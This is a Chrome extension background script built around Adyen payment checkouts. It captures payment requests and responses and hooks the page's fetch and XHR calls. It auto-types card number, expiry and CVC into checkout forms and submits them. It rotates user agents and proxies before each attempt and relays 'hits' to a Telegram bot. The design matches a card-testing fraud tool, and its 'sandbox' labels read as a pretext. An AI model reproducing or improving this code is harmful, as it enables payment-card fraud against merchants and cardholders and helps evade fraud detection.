"use strict";

importScripts("proxy.js");
importScripts("telegram.js");

const ADYEN_PATTERNS = [
  '*://checkoutshopper-live.adyen.com/checkoutshopper/v1/*',
  '*://checkoutshopper-test.adyen.com/checkoutshopper/v1/*',
  '*://checkoutshopper-live.adyen.com/checkoutshopper/sessions/*',
  '*://*.adyen.com/*/sessions/*'
];

const MAX_STORED = 50;
let captured = [];
let capturedResponses = [];
const pending = new Map();
const dbgPending = new Map();
let dbgTabId = -1;

const UA_STATE_KEY = "nonoUAState";
const DEFAULT_UAS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
];

const RESP_RE = /checkoutshopper.*\/(payments|sessions|submit|result)(\?|$)/;

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.tabId === -1) return;

    pending.set(details.requestId, {
      tabId: details.tabId,
      url: details.url,
      method: details.method,
      timeStamp: details.timeStamp,
      body: null,
      requestHeaders: [],
      statusCode: null
    });

    if (details.requestBody) {
      const req = pending.get(details.requestId);
      try {
        if (details.requestBody.raw && details.requestBody.raw[0] && details.requestBody.raw[0].bytes) {
          const bytes = details.requestBody.raw[0].bytes;
          const decoded = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
          if (!decoded.includes('\uFFFD')) req.body = decoded;
        } else if (details.requestBody.formData) {
          const params = new URLSearchParams();
          for (const [key, values] of Object.entries(details.requestBody.formData)) {
            for (const v of values) params.append(key, v);
          }
          req.body = params.toString();
        }
      } catch (e) {}
    }
  },
  { urls: ADYEN_PATTERNS },
  ['requestBody']
);

chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    const req = pending.get(details.requestId);
    if (!req) return;
    req.requestHeaders = details.requestHeaders || [];
  },
  { urls: ADYEN_PATTERNS },
  ['requestHeaders', 'extraHeaders']
);

chrome.webRequest.onCompleted.addListener(
  (details) => {
    const req = pending.get(details.requestId);
    if (!req) return;

    req.statusCode = details.statusCode;
    pending.delete(details.requestId);

    const isInteresting = req.body &&
      (req.body.includes('sessionData') || req.body.includes('paymentMethod') || req.body.includes('card'));

    if (!isInteresting) return;

    captured.unshift(req);
    if (captured.length > MAX_STORED) captured.pop();

    chrome.action.setBadgeText({ text: String(captured.length), tabId: req.tabId });
    chrome.action.setBadgeBackgroundColor({ color: '#4ec9b0' });

    chrome.runtime.sendMessage({
      type: 'ADYEN_REQUEST_CAPTURED',
      request: req,
      curl: generateCurl(req)
    }).catch(() => {});

    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon48.png',
      title: 'Adyen Request Captured',
      message: req.method + ' ' + truncateUrl(req.url)
    }, () => {});
  },
  { urls: ADYEN_PATTERNS }
);

chrome.webRequest.onErrorOccurred.addListener(
  (details) => pending.delete(details.requestId),
  { urls: ADYEN_PATTERNS }
);

chrome.tabs.onRemoved.addListener((tabId) => {
  if (tabId === dbgTabId) detachDebugger();
});

chrome.debugger.onEvent.addListener((src, method, params) => {
  if (!params) return;
  if (method === "Network.responseReceived") {
    const url = (params.response && params.response.url) || "";
    if (RESP_RE.test(url)) dbgPending.set(params.requestId, { url: url, base: false });
  } else if (method === "Network.loadingFinished") {
    const rec = dbgPending.get(params.requestId);
    if (!rec) return;
    dbgPending.delete(params.requestId);
    chrome.debugger.sendCommand(
      { tabId: src.tabId },
      "Network.getResponseBody",
      { requestId: params.requestId }
    ).then((res) => {
      let body = res.body || "";
      if (res.base64Encoded) {
        try { body = atob(body); } catch (e) { body = ""; }
      }
      emitCapturedResponse(src.tabId, rec.url, body);
    }).catch(() => {});
  } else if (method === "Network.responseReceivedExtraInfo" || method === "Network.loadingFailed") {
    dbgPending.delete(params.requestId);
  }
});

chrome.debugger.onDetach.addListener(() => {
  dbgTabId = -1;
  dbgPending.clear();
});

function attachDebugger(tabId) {
  return chrome.debugger.attach({ tabId: tabId }, "1.3").then(() => {
    dbgTabId = tabId;
    dbgPending.clear();
    return chrome.debugger.sendCommand({ tabId: tabId }, "Network.enable");
  }).then(async () => {
    const state = await getUAState();
    if (state.enabled) {
      const list = await getUAList();
      if (list[state.index]) await applyUAOverride(tabId, list[state.index]);
    }
  });
}

function detachDebugger() {
  if (dbgTabId === -1) return;
  try { chrome.debugger.detach({ tabId: dbgTabId }); } catch (e) {}
  dbgTabId = -1;
  dbgPending.clear();
}

function emitCapturedResponse(tabId, url, body) {
  const rec = { url: url.slice(0, 220), body: body, at: Date.now() };
  capturedResponses.unshift(rec);
  if (capturedResponses.length > 80) capturedResponses.pop();
  chrome.storage.local.set({ nono_resp: rec });
  chrome.runtime.sendMessage({
    type: "ADYEN_RESPONSE_CAPTURED",
    resp: rec
  }).catch(() => {});
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg && msg.action === 'FF_HOOK') {
    const tabId = sender && sender.tab && sender.tab.id;
    if (!tabId) {
      sendResponse({ error: 'no-tab' });
      return true;
    }
    const tryMain = () => chrome.scripting.executeScript({
      target: { tabId: tabId, frameIds: [0] },
      world: 'MAIN',
      func: injectResponseHook
    });
    tryMain().then(() => {
      sendResponse({ ok: true, world: 'MAIN' });
    }).catch(() => {
      chrome.scripting.executeScript({
        target: { tabId: tabId, allFrames: true },
        func: injectResponseHook
      }).then(() => {
        sendResponse({ ok: true, world: 'default' });
      }).catch((err) => {
        sendResponse({ error: String((err && err.message) || err) });
      });
    });
    return true;
  }
  if (msg && msg.action === 'DBG_ATTACH') {
    const tabId = sender && sender.tab && sender.tab.id;
    if (!tabId) {
      sendResponse({ error: 'no-tab' });
      return true;
    }
    attachDebugger(tabId).then(() => {
      sendResponse({ ok: true });
    }).catch((err) => {
      sendResponse({ error: String((err && err.message) || err) });
    });
    return true;
  }
  if (msg && msg.action === 'DBG_DETACH') {
    detachDebugger();
    sendResponse({ ok: true });
    return true;
  }
  function actionIsTG(msg) {
  return /^TG_/.test(msg.action || "");
}

async function handleTGMessage(msg, sendResponse, sender) {
  try {
    switch (msg.action) {
      case "TG_GET": {
        const cfg = await getTg();
        sendResponse({ cfg: { enabled: cfg.enabled, chatId: cfg.chatId, allow: cfg.allow, hasToken: !!cfg.token } });
        return;
      }
      case "TG_SET": {
        const cfg = await getTg();
        const next = {
          enabled: typeof msg.enabled === "boolean" ? msg.enabled : cfg.enabled,
          token: typeof msg.token === "string" && msg.token ? msg.token : cfg.token,
          chatId: typeof msg.chatId === "string" ? msg.chatId : cfg.chatId,
          allow: Array.isArray(msg.allow) ? msg.allow : (cfg.allow || DEFAULT_ALLOW.slice())
        };
        await setTg(next);
        sendResponse({ ok: true, hasToken: !!next.token });
        return;
      }
      case "TG_TEST": {
        const r = await tgSend("✅ Telegram connected — Adyen Link sandbox bridge is live.");
        sendResponse(r);
        return;
      }
      case "TG_HIT": {
        const tabUrl = sender && sender.tab ? sender.tab.url : "";
        const g = urlAllowed(tabUrl);
        if (!g.ok) { sendResponse({ ok: false, gated: true, reason: g.reason }); return; }
        const cfg = await getTg();
        if (!originPermitted(tabUrl, cfg)) {
          sendResponse({ ok: false, gated: true, reason: "origin not in sandbox allowlist" });
          return;
        }
        const r = await tgSend(msg.text || "");
        sendResponse(r);
        return;
      }
      default:
        sendResponse({ ok: false, error: "unknown tg action" });
    }
  } catch (e) {
    sendResponse({ ok: false, error: String((e && e.message) || e) });
  }
}

if (msg && actionIsTG(msg)) {
    handleTGMessage(msg, sendResponse, sender);
    return true;
  }
  if (msg && /^UA_/.test(msg.action || "")) {
    const tabId = sender && sender.tab && sender.tab.id;
    handleUAMessage(Object.assign({}, msg, { tabId: msg.tabId || tabId }), sendResponse);
    return true;
  }
  if (msg && /^PROXY_/.test(msg.action || "")) {
    handleProxyMessage(msg, sendResponse);
    return true;
  }
  if (msg && msg.type === 'GET_RESPONSES') {
    sendResponse({ responses: capturedResponses });
    return true;
  }
  if (msg && msg.type === 'GET_CAPTURED') {
    sendResponse({ captured });
    return true;
  }
  if (msg && msg.type === 'CLEAR_CAPTURED') {
    captured = [];
    chrome.action.setBadgeText({ text: '' });
    sendResponse({ ok: true });
    return true;
  }
  if (msg && msg.action === 'FF_EXEC') {
    const tabId = sender && sender.tab && sender.tab.id;
    if (!tabId) {
      sendResponse({ error: 'no-tab', results: [] });
      return true;
    }
    chrome.scripting.executeScript({
      target: { tabId: tabId, allFrames: true },
      func: injectFill,
      args: [msg.card || {}]
    }).then((res) => {
      const results = (res || [])
        .map((r) => r.result)
        .filter(Boolean);
      const any = results.some((r) => r && r.any);
      const fields = results.reduce((acc, r) => {
        if (!r || !r.fields) return acc;
        ['number', 'month', 'year', 'cvc'].forEach((f) => {
          if (r.fields[f]) acc[f] = true;
        });
        return acc;
      }, { number: false, month: false, year: false, cvc: false });
      sendResponse({ results: results, any: any, fields: fields });
    }).catch((err) => {
      sendResponse({ error: String((err && err.message) || err), results: [] });
    });
    return true;
  }
});

function injectFill(card) {
  function setNativeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : el instanceof HTMLSelectElement
        ? HTMLSelectElement.prototype
        : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, 'value');
    if (!desc) return;
    desc.set.call(el, value);
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
    el.dispatchEvent(new Event('blur', { bubbles: true }));
  }

  function typeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, 'value');
    if (!desc) return;
    desc.set.call(el, '');
    try {
      el.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'deleteContentBackward' }));
    } catch (e) {}
    const str = String(value);
    for (let i = 0; i < str.length; i++) {
      const ch = str[i];
      desc.set.call(el, el.value + ch);
      try {
        el.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new InputEvent('beforeinput', { bubbles: true, cancelable: true, inputType: 'insertText', data: ch }));
        el.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertText', data: ch }));
        el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, cancelable: true, key: ch }));
      } catch (e) {
        el.dispatchEvent(new Event('input', { bubbles: true }));
      }
    }
    try {
      el.dispatchEvent(new InputEvent('input', { bubbles: true }));
    } catch (e) {}
    el.dispatchEvent(new Event('change', { bubbles: true }));
    el.dispatchEvent(new Event('blur', { bubbles: true }));
    el.dispatchEvent(new FocusEvent('focusout', { bubbles: true }));
  }

  function classify(el) {
    const s = ((el.id || '') + ' ' + (el.name || '') + ' ' +
      (el.getAttribute('aria-label') || '') + ' ' +
      (el.getAttribute('data-fieldtype') || '') + ' ' +
      (el.getAttribute('autocomplete') || '') + ' ' +
      (typeof el.className === 'string' ? el.className : '')).toLowerCase();
    if (/(card\s*[-_ ]*number|ccnum|cc[-_ ]number|\bpan\b|encrypted\w*(number|pan))/.test(s)) return 'number';
    if (/(expiry|expiration)[-_ ]*(month)?|encrypted\w*month|expmonth/.test(s) && !/year/.test(s)) return 'month';
    if (/(expiry|expiration)[-_ ]*year|encrypted\w*year|expyear/.test(s) || (/exp/.test(s) && /year/.test(s))) return 'year';
    if (/(cvc|cvv|csc|security)[-_ ]*(code)?/.test(s)) return 'cvc';
    return null;
  }

  const fields = { number: false, month: false, year: false, cvc: false };
  let any = false;
  let cvcEl = null;

  const inputs = Array.from(document.querySelectorAll('input'));
  for (const inp of inputs) {
    if (inp.type === 'hidden') continue;
    const kind = classify(inp);
    if (!kind) continue;
    if (kind === 'number' && !fields.number) {
      typeValue(inp, card.number || '');
      fields.number = true; any = true;
    } else if (kind === 'month' && !fields.month) {
      typeValue(inp, String(card.month || card.expiryMonth || '12').padStart(2, '0'));
      fields.month = true; any = true;
    } else if (kind === 'year' && !fields.year) {
      typeValue(inp, String(card.year || card.expiryYear || '2029').slice(-2));
      fields.year = true; any = true;
    } else if (kind === 'cvc' && !fields.cvc) {
      typeValue(inp, card.cvc || '');
      fields.cvc = true; any = true;
      cvcEl = inp;
    }
  }

  if (!fields.number) {
    const n = document.querySelector(
      'input[autocomplete="cc-number"], input[name*="cardNumber"], input[id*="cardNumber"]'
    );
    if (n) { typeValue(n, card.number || ''); fields.number = true; any = true; }
  }
  if (!fields.month && !fields.year) {
    const e = document.querySelector(
      'input[autocomplete="cc-exp"], input[name*="expiry"], input[id*="expiry"]'
    );
    if (e) {
      typeValue(e, String(card.month || card.expiryMonth || '12').padStart(2, '0') + '/' +
        String(card.year || card.expiryYear || '2029').slice(-2));
      fields.month = true; fields.year = true; any = true;
    }
  }
  if (!fields.cvc) {
    const c = document.querySelector(
      'input[autocomplete="cc-csc"], input[name*="securityCode"], input[name*="cvc"]'
    );
    if (c) { typeValue(c, card.cvc || ''); fields.cvc = true; any = true; cvcEl = c; }
  }

  if (cvcEl) {
    const enter = { bubbles: true, cancelable: true, key: 'Enter', code: 'Enter', keyCode: 13, which: 13 };
    try {
      cvcEl.dispatchEvent(new KeyboardEvent('keydown', enter));
      cvcEl.dispatchEvent(new KeyboardEvent('keypress', enter));
      cvcEl.dispatchEvent(new KeyboardEvent('keyup', enter));
    } catch (e) {}
  }

  const holderEl = document.querySelector(
    'input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]'
  );
  if (holderEl) setNativeValue(holderEl, card.holder || 'JOHN DOE');

  const emailEl = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
  const candidateEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || '');
  if (emailEl && candidateEmail) {
    setNativeValue(emailEl, candidateEmail);
  }

  return { fields: fields, any: any, url: location.href.slice(0, 120) };
}

function injectResponseHook() {
  if (window.__nonohooked) return;
  window.__nonohooked = true;

  const isAdyen = (url) => /checkoutshopper.*\/(payments|sessions|submit)(\?|$)/.test(url);

  const push = (data) => {
    try {
      document.dispatchEvent(new CustomEvent('nonnho-capture', { detail: data }));
    } catch (e) {}
  };

  const OXHR = window.XMLHttpRequest;
  if (OXHR) {
    try {
      window.XMLHttpRequest = function () {
        const x = new OXHR();
        const oOpen = x.open;
        x.open = function (m, url, ...rest) {
          x.__nurl = String(url || '');
          try { return oOpen.apply(this, [m, url, ...rest]); }
          catch (e) { return oOpen.apply(this, arguments); }
        };
        x.addEventListener('load', function () {
          try {
            const u = String(x.__nurl || '');
            if (isAdyen(u)) {
              push({ kind: 'xhr', url: u, status: x.status, body: x.responseText || '' });
            }
          } catch (e) {}
        });
        return x;
      };
      window.XMLHttpRequest.prototype = OXHR.prototype;
    } catch (e) {}
  }

  const OF = window.fetch;
  if (OF) {
    try {
      window.fetch = function (input, init) {
        const url = (typeof input === 'string')
          ? input
          : (input && input.url ? input.url : '');
        const p = OF.apply(this, arguments);
        if (isAdyen(url)) {
          p.then((res) => {
            try {
              const clone = res.clone();
              clone.text().then((t) => {
                push({ kind: 'fetch', url: url, status: res.status, body: t || '' });
              }).catch(() => {});
            } catch (e) {}
          }).catch(() => {});
        }
        return p;
      };
    } catch (e) {}
  }
}

function stripHdr(h) {
  const name = (h.name || '').toLowerCase();
  return ['host', 'connection', 'content-length', 'accept-encoding'].includes(name);
}

function generateCurl(req) {
  const lines = ["curl '" + (req.url || '') + "'"];

  if (req.requestHeaders && Array.isArray(req.requestHeaders)) {
    const sorted = [...req.requestHeaders]
      .filter((h) => !stripHdr(h))
      .sort((a, b) => {
        const na = (a.name || '').toLowerCase();
        const nb = (b.name || '').toLowerCase();
        if (na === 'user-agent') return 1;
        if (nb === 'user-agent') return -1;
        return na.localeCompare(nb);
      });
    for (const h of sorted) {
      lines.push('  -H ' + sq((h.name || '').toLowerCase() + ': ' + (h.value || '')));
    }
  }

  if (req.body && typeof req.body === 'string') {
    lines.push('  --data-raw $' + dqLD(req.body));
  }

  return lines.join(' \\\n');
}

function sq(str) {
  return "'" + str.replace(/'/g, "'\\''") + "'";
}

function dqLD(str) {
  return "'" + str
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "'\\''")
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t') + "'";
}

function truncateUrl(url, max) {
  max = max || 60;
  return url.length > max ? url.slice(0, max) + '…' : url;
}

async function getUAState() {
  const r = await chrome.storage.local.get(UA_STATE_KEY);
  return r[UA_STATE_KEY] || { enabled: false, index: 0 };
}

async function setUAState(state) {
  await chrome.storage.local.set({ [UA_STATE_KEY]: state });
}

async function getUAList() {
  const r = await chrome.storage.local.get("nonoUAList");
  const list = Array.isArray(r.nonoUAList) && r.nonoUAList.length ? r.nonoUAList : DEFAULT_UAS.slice();
  return list;
}

async function applyUAOverride(tabId, ua) {
  if (tabId == null) return { ok: false, error: "no tab" };
  try {
    await chrome.debugger.sendCommand({ tabId: tabId }, "Network.setUserAgentOverride", {
      userAgent: ua,
      platform: /Macintosh/.test(ua) ? "MacIntel" : /Firefox/.test(ua) ? "Linux" : "Win32"
    });
    return { ok: true };
  } catch (e) {
    return { ok: false, error: String((e && e.message) || e) };
  }
}

async function handleUAMessage(msg, sendResponse) {
  try {
    switch (msg.action) {
      case "UA_GET_STATE": {
        sendResponse({ state: await getUAState(), list: await getUAList() });
        return;
      }
      case "UA_SET_LIST": {
        const list = (msg.text || "").split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
        await chrome.storage.local.set({ nonoUAList: list });
        sendResponse({ ok: true, list: list });
        return;
      }
      case "UA_SET_STATE": {
        const state = { enabled: !!msg.enabled, index: typeof msg.index === "number" ? msg.index : 0 };
        await setUAState(state);
        if (state.enabled) {
          const list = await getUAList();
          if (state.index >= list.length) state.index = 0;
          const ua = list[state.index];
          await setUAState(state);
          await applyUAOverride(msg.tabId, ua);
        }
        sendResponse({ ok: true, state: state });
        return;
      }
      case "UA_NEXT": {
        const state = await getUAState();
        if (!state.enabled) { sendResponse({ ok: false, label: "", skipped: true }); return; }
        const list = await getUAList();
        if (!list.length) { sendResponse({ ok: false, label: "", error: "no uas" }); return; }
        let idx = state.index + 1;
        if (idx >= list.length) idx = 0;
        state.index = idx;
        state.enabled = true;
        await setUAState(state);
        const ua = list[idx];
        const r = await applyUAOverride(msg.tabId || dbgTabId, ua);
        const short = ua.replace(/^Mozilla\/5\.0\s*\([^)]*\)\s*/, "").split("/")[0] || "UA";
        sendResponse({ ok: r.ok, index: idx, total: list.length, label: short + " #" + (idx + 1), error: r.error });
        return;
      }
      case "UA_APPLY_INDEX": {
        const state = await getUAState();
        const list = await getUAList();
        let idx = typeof msg.index === "number" ? msg.index : state.index;
        if (idx >= list.length) idx = 0;
        state.index = idx;
        state.enabled = true;
        await setUAState(state);
        const ua = list[idx];
        const r = await applyUAOverride(msg.tabId || dbgTabId, ua);
        sendResponse({ ok: r.ok, index: idx, label: ua, error: r.error });
        return;
      }
      default:
        sendResponse({ ok: false, error: "unknown ua action" });
    }
  } catch (e) {
    sendResponse({ ok: false, error: String((e && e.message) || e) });
  }
}

async function handleProxyMessage(msg, sendResponse) {
  try {
    switch (msg.action) {
      case 'PROXY_GET_STATE': {
        const state = await loadState();
        const list = await loadList();
        sendResponse({ state: state, list: list });
        return;
      }
      case 'PROXY_PARSE_LIST': {
        const list = parseProxyText(msg.text || '');
        await saveList(list);
        const state = await loadState();
        sendResponse({ list: list, state: state });
        return;
      }
      case 'PROXY_SET_STATE': {
        const list = await loadList();
        let index = typeof msg.index === 'number' ? msg.index : 0;
        if (index >= list.length && list.length) index = 0;
        await saveState({
          enabled: !!msg.enabled,
          mode: msg.mode || 'single',
          index: index,
          exitIP: msg.exitIP || '',
          lastError: ''
        });
        const r = await applyCurrent();
        sendResponse(Object.assign({ proxy: r.proxy ? r.proxy : null }, r));
        return;
      }
      case 'PROXY_ROTATE': {
        const r = await rotate();
        sendResponse(Object.assign({ proxy: r.proxy ? r.proxy : null }, r));
        return;
      }
      case 'PROXY_APPLY_INDEX': {
        const r = await rotate(msg.index);
        sendResponse(Object.assign({ proxy: r.proxy ? r.proxy : null }, r));
        return;
      }
      case 'PROXY_OFF': {
        const state = await loadState();
        state.enabled = false;
        state.exitIP = '';
        await saveState(state);
        const r = await clearProxy();
        sendResponse({ ok: r.ok, proxy: null, error: r.error });
        return;
      }
      case 'PROXY_STATUS': {
        const state = await loadState();
        const list = await loadList();
        const p = state.enabled && list[state.index] ? list[state.index] : null;
        sendResponse({ enabled: state.enabled, proxy: p, label: p ? p.label : 'OFF' });
        return;
      }
      case 'PROXY_BEFORE_HIT': {
        const state = await loadState();
        if (!state.enabled) {
          sendResponse({ proxy: null, ok: false });
          return;
        }
        const r = state.mode === 'rotate' ? await rotate() : await applyCurrent();
        sendResponse({ proxy: r.proxy ? r.proxy : null, ok: r.ok, error: r.error });
        return;
      }
      case 'PROXY_TEST': {
        const r = await testProxy(typeof msg.index === 'number' ? msg.index : 0);
        sendResponse(r);
        return;
      }
      case 'PROXY_TEST_ALL': {
        sendResponse({ running: true });
        testAll();
        return;
      }
      default:
        sendResponse({ error: 'unknown proxy action' });
    }
  } catch (e) {
    sendResponse({ ok: false, error: String((e && e.message) || e) });
  }
}